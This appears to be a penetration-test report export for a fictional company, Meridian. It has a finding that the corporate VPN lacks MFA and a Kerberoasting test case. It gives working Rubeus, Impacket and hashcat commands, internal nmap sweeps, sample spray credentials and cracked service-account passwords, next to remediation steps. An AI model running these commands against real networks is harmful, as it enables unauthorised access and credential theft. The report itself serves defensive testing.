findings.title: VPN Allows Password Authentication Without MFA
findings.description:
## Summary

The corporate **VPN** (`vpn.meridian.example`) accepts *password-only* authentication and does **not** enforce multi-factor authentication (MFA). Anyone with a valid credential — from phishing or a breach dump — can log straight in.

- Endpoint: `https://vpn.meridian.example`
- Auth realm: `corp` (LDAP password)
- MFA: **not enforced**

Example authentication request:

```http
POST /remote/logincheck HTTP/1.1
Host: vpn.meridian.example
Content-Type: application/x-www-form-urlencoded

username=jdoe&credential=Summer2026!&realm=corp
```

> No second factor is requested at any point in the flow.
findings.impact:
## Impact

A single set of leaked credentials grants **full internal network access**. On Meridian's flat internal network this is effectively an initial-access foothold.

1. No MFA → credential stuffing / password spray is viable
2. The tunnel lands on the internal `10.0.0.0/8` range
3. Reused corporate passwords appear in prior breach corpora

```python
# Illustrative spray success against the VPN
attempts, successful = 5000, 12
print(f"success rate: {successful / attempts:.2%}")  # success rate: 0.24%
```
findings.technical_details:
## Technical Details

The FortiGate SSL-VPN portal binds `VPN-Users` to a local password realm with **no FortiToken / RADIUS-MFA** policy attached.

```bash
# Observed config (sanitized)
config vpn ssl settings
    set servercert "Fortinet_Factory"
    set source-interface "wan1"
end
config user group
    edit "VPN-Users"
        set member "corp-ldap"      # <-- password realm, no MFA member
    next
end
```

Note the absence of any `two-factor` / `fortitoken` binding on `VPN-Users`.
findings.steps_to_reproduce:
## Steps to Reproduce

1. Obtain a valid corporate credential (phish, breach dump, or spray).
2. Browse to the SSL-VPN portal at `https://vpn.meridian.example/remote/login`.
3. Submit username + password and observe that **no MFA prompt** appears.
4. Confirm the tunnel and internal reachability:

```bash
# From the established tunnel
ping -c1 10.0.0.10
nmap -sn 10.0.10.0/24
```

You now have routed access to the internal network.
findings.mitigations:
## Remediation

**Enforce MFA on all remote-access authentication.**

- [ ] Bind a FortiToken / RADIUS-MFA policy to `VPN-Users`
- [ ] Disable password-only realms for remote access
- [ ] Alert on any VPN login lacking a second factor

```bash
config user group
    edit "VPN-Users"
        set member "corp-ldap" "fortitoken-mfa"
    next
end
```
findings.references:
## References

- [NIST SP 800-63B — Authentication Assurance](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [MITRE ATT&CK T1133 — External Remote Services](https://attack.mitre.org/techniques/T1133/)
- CIS Control 6.5 — *Require MFA for Remote Network Access*

```text
CWE-308: Use of Single-factor Authentication
```

testcases.title: Kerberoast domain service accounts
testcases.description:
## Objective

Request Kerberos **service tickets (TGS)** for accounts with an SPN and crack them offline to recover service-account passwords.

- Technique: **Kerberoasting** (`MITRE ATT&CK T1558.003`)
- Target: domain service accounts in `MERIDIAN.LOCAL`
- Prereq: *any* authenticated domain user

```text
SPN accounts are encrypted with the service account's NTLM hash,
which is crackable offline without touching the DC again.
```
testcases.steps:
## Steps

1. Enumerate SPNs and request TGS tickets with Rubeus:

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

2. Or from Linux with Impacket:

```bash
GetUserSPNs.py -request -dc-ip 10.0.0.10 \
  MERIDIAN.LOCAL/jdoe:'Summer2026!' -outputfile hashes.txt
```

3. Crack the tickets offline:

```bash
hashcat -m 13100 hashes.txt rockyou.txt -O
```
testcases.expected_result:
## Expected Result

At least one `$krb5tgs$` hash is recovered and cracked, yielding a **plaintext service-account password**.

```text
$krb5tgs$23$*svc_sql$MERIDIAN.LOCAL$MSSQLSvc/db01...  ->  P@ssw0rd-SQL-2026
```

The recovered account should carry elevated rights (DB admin, backup operator, etc.).
testcases.actual_result:
## Actual Result

**3 SPNs** enumerated, **1 cracked** within ~4 minutes:

```text
svc_sql   MSSQLSvc/db01.meridian.local   ->  CRACKED: P@ssw0rd-SQL-2026
svc_web   HTTP/intranet.meridian.local   ->  not cracked
svc_bkp   CIFS/backup01.meridian.local   ->  CRACKED: Backup!ng2026
```

> `svc_bkp` is a member of **Backup Operators** — a viable path to DC.
testcases.notes:
## Notes

- Use `-O` (optimized kernel) in hashcat for a big speedup on `-m 13100`.
- `svc_web` is AES-only (`etype 17/18`), so an RC4 downgrade wasn't available:

```bash
# Confirm supported etypes
GetUserSPNs.py -dc-ip 10.0.0.10 MERIDIAN.LOCAL/jdoe:'Summer2026!'
```

Remediation: rotate + set 25+ char passwords on all `svc_*` accounts, or move to **gMSA**.
